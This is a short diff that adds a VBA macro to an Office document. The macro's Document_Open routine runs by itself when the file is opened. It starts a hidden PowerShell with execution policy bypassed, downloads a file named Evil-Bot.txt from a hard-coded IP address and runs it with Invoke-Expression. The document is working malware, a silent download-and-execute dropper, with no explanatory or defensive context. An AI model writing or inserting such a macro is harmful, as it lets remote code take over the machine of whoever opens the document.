@@ -1,0 +1,5 @@
+Private Sub Document_Open()
+    strCommand = "powershell.exe -NoP -NonI -w hidden -Exec bypass Invoke-WebRequest 'http://35.165.190.126/PS_Bot/Evil-Bot.txt' | Invoke-Expression"
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.Run strCommand, 0, True
+End Sub
